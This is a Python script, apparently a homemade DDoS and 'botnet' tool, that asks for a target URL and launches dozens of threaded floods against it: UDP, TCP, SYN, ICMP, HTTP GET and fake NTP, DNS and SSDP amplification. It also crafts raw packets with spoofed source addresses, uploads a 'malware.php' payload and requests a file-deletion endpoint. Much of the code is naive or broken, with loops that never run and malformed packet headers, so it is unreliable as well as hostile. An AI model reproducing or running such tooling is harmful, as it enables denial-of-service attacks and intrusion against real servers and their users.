import random
import socket
import struct
import threading
import requests
import os



print("""

      

   █████████                                    █████████                                              █████████                     ███ 
  ███░░░░░███                                  ███░░░░░███                                            ███░░░░░███                   ░░░  
 ░███    ░███  ████████    ██████  ████████   ███     ░░░   ██████    █████████  █████████ █████ ████░███    ░░░   ██████   ██████  ████ 
 ░███████████ ░░███░░███  ███░░███░░███░░███ ░███          ░░░░░███  ░█░░░░███  ░█░░░░███ ░░███ ░███ ░░█████████  ███░░███ ███░░███░░███ 
 ░███░░░░░███  ░███ ░███ ░███ ░███ ░███ ░███ ░███           ███████  ░   ███░   ░   ███░   ░███ ░███  ░░░░░░░░███░███ ░███░███ ░░░  ░███ 
 ░███    ░███  ░███ ░███ ░███ ░███ ░███ ░███ ░░███     ███ ███░░███    ███░   █   ███░   █ ░███ ░███  ███    ░███░███ ░███░███  ███ ░███ 
 █████   █████ ████ █████░░██████  ████ █████ ░░█████████ ░░████████  █████████  █████████ ░░███████ ░░█████████ ░░██████ ░░██████  █████
░░░░░   ░░░░░ ░░░░ ░░░░░  ░░░░░░  ░░░░ ░░░░░   ░░░░░░░░░   ░░░░░░░░  ░░░░░░░░░  ░░░░░░░░░   ░░░░░███  ░░░░░░░░░   ░░░░░░   ░░░░░░  ░░░░░ 
                                                                                            ███ ░███                                     
                                                                                           ░░██████                                      
                                                                                            ░░░░░░                                         

""")


target_url = input("Target url: ")
target_port = 80
botnet_size = 100000000
bot_count = 100000000
infected_devices = []
fake_ip = '96.250.255.190'
source_ip = '192.168.0.100'
destination_ip = '10.0.0.1'
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
ip_header = struct.pack('!BBHHHBBH4s4s', 4 << 4, 0, 0, 0, 0, 255, socket.IPPROTO_TCP, 0, socket.inet_aton(source_ip), socket.inet_aton(destination_ip))
s.sendto(ip_header, (destination_ip, 0))

target_ip = target_url

spoofed_ip = "163.50.113.109"

s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

def generate_ip_header(source_ip, dest_ip):
    ip_version = 4
    ip_header_length = 5
    ip_tos = 0
    ip_total_length = 0  
    ip_id = random.randint(1, 65535)
    ip_frag_offset = 0
    ip_ttl = 255
    ip_protocol = socket.IPPROTO_TCP
    ip_checksum = 0  
    ip_source_address = socket.inet_aton(source_ip)
    ip_dest_address = socket.inet_aton(dest_ip)

    ip_header = struct.pack('!BBHHHBBH4s4s',
                            (ip_version << 4) + ip_header_length,
                            ip_tos,
                            ip_total_length,
                            ip_id,
                            (ip_frag_offset << 13),
                            ip_ttl,
                            ip_protocol,
                            ip_checksum,
                            ip_source_address,
                            ip_dest_address)

    return ip_header

def send_packet():
    while True:
        source_ip = spoofed_ip
        dest_ip = target_ip

        ip_header = generate_ip_header(source_ip, dest_ip)

        s.sendto(ip_header, (dest_ip, 0))

def attack_server(malware_path):
    url = target_url 
    payload = open(malware_path, 'rb').read()
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}  
    response = requests.post(url, data=payload, headers=headers)
    if response.status_code == 200:
        print("Server successfully attacked!")
    else:
        print("Attack failed. Better luck next time!")
malware_file = "/path/to/malware.php"  
attack_server(malware_file)


user_agents = [

    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",

    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0",

    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edg/94.0.992.50",

    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",

    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",

    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.2 Safari/605.1.1",

    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",

    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12",

    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36",

    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9",

    "Mozilla/5.0 (iPhone; CPU iPhone OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/44.0.2403.67 Mobile/12D508 Safari/600.1.4",

    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",

    "Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0",

    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36",

    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",

    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36",

    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/42.0 Safari/537.31",

    "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",

    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",

    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10",

    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",

    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",

    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/50.0.125 Chrome/44.0.2403.125 Safari/537.36",

    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",

    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",

    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36 Edge/12.0",

    "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0",

    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; GTB7.5; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C)",

    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",

    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",

    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0) LinkCheck by Siteimprove.com",

    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36",

    "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko",

    "Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",

    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",

    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",

    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",

    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",

    "Mozilla/5.0 (BB10; Touch) AppleWebKit/537.35+ (KHTML, like Gecko) Version/10.3.2.2339 Mobile Safari/537.35+",

    "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36",

    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",

    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",

    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0",

    "Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 525) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537",

    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36",

    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:37.0) Gecko/20100101 Firefox/37.0",

    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/44.0.2403.89 Chrome/44.0.2403.89 Safari/537.36",

    "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",

    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.1.25 (KHTML, like Gecko) QuickLook/5.0",

    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0",

    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko",

    "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",

    "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko",

    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",

    "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0",

    "Mozilla/5.0 (Linux; U; Android 4.3; en-us; ZTE-Z667G Build/JLS36C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",

    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",

    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; ASU2JS; rv:11.0) like Gecko",

    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",

    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",

    "Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36",

    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36",

    "Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4",

    "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",

    "Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",

    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like Gecko",

    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0",

    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)",

    "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",

    "Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53",

    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",

    "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4",

]


def create_bot():

    bot = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    bot.connect((target_url, target_port))

    bot.sendall(b"CazzySoci is Here!")

    response = bot.recv(1024)

    print(response.decode())

    bot.close()


def generate_payload():

    payload = ""

    for _ in range(random.randint(100, 1000)):

        payload += chr(random.randint(0, 255))

    return payload


def generate_random_ip():
    return socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))


def send_payload(ip):

    while True:

        try:

            target_ip = socket.gethostbyname(target_url)

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            s.connect((target_ip, target_port))

            payload = generate_payload()

            s.sendall(payload.encode())

            s.close()

        except:

            pass


def infect_devices():

    while True:

        try:

            target_ip = socket.gethostbyname(target_url)

            payload = generate_payload()

            user_agent = random.choice(user_agents)

            headers = {'User-Agent': user_agent, 'X-Forwarded-For': generate_random_ip()}

            response = requests.post(f"http://{target_url}/infect", data=payload, headers=headers, timeout=0.001)

            device_info = response.text  

            infected_devices.append(device_info)

        except:

            pass


def delete_files():

    while True:

        try:

            target_ip = socket.gethostbyname(target_url)

            user_agent = random.choice(user_agents)

            headers = {'User-Agent': user_agent}

            requests.get(f"http://{target_url}/delete_all_files", headers=headers, timeout=0.001)

        except:

            pass


def fetch_infected_devices():

    while True:

        print("Infected devices:", infected_devices)

        infected_devices.clear()


def start_infection():

    while True:

        for _ in range(botnet_size):

            ip = generate_random_ip()

            threading.Thread(target=infect_devices).start()


def udp_flood():

    while True:

        try:

            target_ip = socket.gethostbyname(target_url)

            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            payload = generate_payload()

            s.sendto(payload.encode(), (target_ip, target_port))

            s.close()

        except:

            pass


def syn_flood():

    while True:

        try:

            target_ip = socket.gethostbyname(target_url)

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            s.connect((target_ip, target_port))

            s.sendall(generate_payload().encode())

            s.close()

        except:

            pass


def ntp_amplification():

    while True:

        try:

            target_ip = socket.gethostbyname(target_url)

            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            payload = generate_payload()

            s.sendto(payload.encode(), (target_ip, 123))

            s.close()

        except:

            pass


def dns_amplification():

    while True:

        try:

            target_ip = socket.gethostbyname(target_url)

            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            payload = generate_payload()

            s.sendto(payload.encode(), (target_ip, 53))

            s.close()

        except:

            pass


def ssdp_amplification():

    while True:

        try:

            target_ip = socket.gethostbyname(target_url)

            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            payload = generate_payload()

            s.sendto(payload.encode(), (target_ip, 1900))

            s.close()

        except:

            pass


def ip_fragmentation():

    while True:

        try:

            target_ip = socket.gethostbyname(target_url)

            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

            payload = generate_payload()

            s.sendto(payload.encode(), (target_ip, target_port))

            s.close()

        except:

            pass


def syn_ack_flood():

    while True:

        try:

            target_ip = socket.gethostbyname(target_url)

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            s.connect((target_ip, target_port))

            s.sendall(generate_payload().encode())

            s.recv(1024)

            s.close()

        except:

            pass


def http_get_attack():

    while True:

        try:

            target_ip = socket.gethostbyname(target_url)

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            s.connect((target_ip, target_port))

            s.sendall(f"GET / HTTP/1.1\r\nHost: {target_url}\r\n\r\n".encode())

            s.recv(1024)

            s.close()

        except:

            pass


def tcp_attack():

    while True:

        try:

            target_ip = socket.gethostbyname(target_url)

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            s.connect((target_ip, target_port))

            s.sendall(generate_payload().encode())

            s.recv(1024)

            s.close()

        except:

            pass


def ssl_tls_floods():

    while True:

        try:

            target_ip = socket.gethostbyname(target_url)

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            s.connect((target_ip, 443))

            s.sendall(generate_payload().encode())

            s.close()

        except:

            pass


def tcp_rst_flood():

    while True:

        try:

            target_ip = socket.gethostbyname(target_url)

            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)

            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            packet = struct.pack("!4s4sHH", socket.inet_aton(generate_random_ip()), socket.inet_aton(target_ip), 0, target_port)

            s.sendto(packet, (target_ip, target_port))

        except:

            pass


def tcp_ack_flood():

    while True:

        try:

            target_ip = socket.gethostbyname(target_url)

            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)

            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            packet = struct.pack("!4s4sHH", socket.inet_aton(generate_random_ip()), socket.inet_aton(target_ip), 0, target_port)

            s.sendto(packet, (target_ip, target_port))

        except:

            pass


def tcp_fin_flood():

    while True:

        try:

            target_ip = socket.gethostbyname(target_url)

            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)

            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            packet = struct.pack("!4s4sHH", socket.inet_aton(generate_random_ip()), socket.inet_aton(target_ip), 0, target_port)

            s.sendto(packet, (target_ip, target_port))

        except:

            pass


def tcp_syn_flood():

    while True:

        try:

            target_ip = socket.gethostbyname(target_url)

            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)

            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            packet = struct.pack('!4s4sBBH', socket.inet_aton(generate_random_ip()), socket.inet_aton(target_ip), 0, socket.IPPROTO_TCP, 20)

            s.sendto(packet, (target_ip, target_port))

        except:

            pass


def ping_flood(target_ip):

    while True:

        os.system(f"ping -c 1 -s 65507 {target_ip} > /dev/null")


def icmp_attack(target_ip):

    while True:

        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

        packet = struct.pack('!BBHHH32s', 8, 0, 0, random.randint(1, 65535), 1, b'')

        sock.sendto(packet, (target_ip, 0))


def check_website_status():

    while True:

        try:

            response = requests.get(f"http://{target_url}", timeout=0.001)

            if response.status_code == 200:

                print("Attack was successful! The website is down.")

        except:

            pass


def start_botnet():

    for _ in range(bot_count, botnet_size):

        threading.Thread(target=create_bot).start()



def start_attack():

    while True:

        for _ in range(botnet_size, bot_count):

            ip = generate_random_ip()

            threading.Thread(target=send_payload, args=(ip,)).start()


def monitor_attack():

    while True:

        print("Attack is in progress!")


if __name__ == "__main__":

    start_botnet()

    send_packet()

    threading.Thread(target=start_attack).start()

    threading.Thread(target=monitor_attack).start()

    threading.Thread(target=start_infection).start()

    threading.Thread(target=delete_files).start()  

    threading.Thread(target=fetch_infected_devices).start()

    threading.Thread(target=udp_flood).start()

    threading.Thread(target=syn_flood).start()

    threading.Thread(target=ntp_amplification).start()

    threading.Thread(target=dns_amplification).start()

    threading.Thread(target=ssdp_amplification).start()

    threading.Thread(target=ip_fragmentation).start()

    threading.Thread(target=syn_ack_flood).start()

    threading.Thread(target=http_get_attack).start()

    threading.Thread(target=tcp_attack).start()

    threading.Thread(target=ssl_tls_floods).start()

    threading.Thread(target=tcp_rst_flood).start()

    threading.Thread(target=tcp_ack_flood).start()

    threading.Thread(target=tcp_fin_flood).start()

    threading.Thread(target=tcp_syn_flood).start()

    threading.Thread(target=ping_flood, args=(target_ip,)).start()

    threading.Thread(target=icmp_attack, args=(target_ip,)).start()

    threading.Thread(target=check_website_status).start()

    num_threads = 999999  

    for _ in range(num_threads):

        threading.Thread(target=send_payload, args=(generate_random_ip(),)).start()
